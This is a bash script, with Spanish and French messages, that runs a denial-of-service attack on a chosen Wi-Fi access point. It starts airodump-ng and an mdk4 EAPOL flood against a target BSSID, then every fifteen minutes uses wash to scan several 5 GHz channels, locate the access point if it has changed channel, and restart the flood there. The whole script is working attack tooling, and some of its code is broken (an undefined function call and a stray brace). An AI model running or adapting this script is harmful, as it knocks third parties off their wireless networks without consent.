#!/bin/bash
echo $$ >/tmp/terminalfrequence.pid

#####################################################

f_variables(){
intmoniteur5ghz="$(cat cartef.txt)"
canal5ghz="$(cat canalf.txt)"
BSSID5ghz="$(cat bssidf.txt)"
echo "$intmoniteur5ghz"
while [ -z "${intmoniteur5ghz}" ]; do read -r ${intmoniteur5ghz}; done



echo "$canal5ghz"
while [ -z "${canal5ghz}" ]; do read -r ${canal5ghz}; done



echo "$BSSID5ghz"
while [ -z ${BSSID5ghz} ]; do read -r ${BSSID5ghz}; done
f_floodinstantane
}



#####################################################

f_checkap(){        
kill `cat /tmp/airodumpghzz.pid`
sleep 2;
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP no ha movido, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/mdk4.pid`
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP ha movido... buscando le...\e[0m"
sleep 1;
rm -rf output5ghz.txt
kill `cat /tmp/mdk4.pid`
kill `cat /tmp/airodumpghz.pid`
sleep 5;
fi

canal5ghz=36
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi

canal5ghz=32
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi

canal5ghz=128
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi

canal5ghz=112
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi

canal5ghz=108
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi

canal5ghz=104
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi

canal5ghz=44
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi

canal5ghz=100
wash -i ${intmoniteur5ghz} -a -c ${canal5ghz} > output5ghz.txt &
echo $! >/tmp/airodumpghz.pid
sleep 7;
if grep -q "${BSSID5ghz}" "output5ghz.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodumpghz.pid`
rm -rf output5ghz.txt
fi
}

#####################################################

f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
           echo -e "\e[1;34m[*]\e[0m Iniciando el DoS... el canal del AP  va a estar vérificando cada tiempo en segundas que has entrado..."
sleep 1;
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal5ghz} ${intmoniteur5ghz} &> /dev/null &
echo $! >/tmp/airodumpghzz.pid
sleep 10;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk4 ${intmoniteur5ghz} e -t ${BSSID5ghz} -l &> /dev/null &
echo $! >/tmp/mdk4.pid
sleep 20;
while : ; do
sleep 900 ; f_checkap ; done
}


#####################################################
f_activedos(){
clear
echo "1.  Dos"
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_floodinterface ;;
*) f_activedos ;;
esac
}


# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[]\e[0m Ve te pedir al admin !" 1>&2
	exit 1
else
	clean=1
	f_variables
fi
}

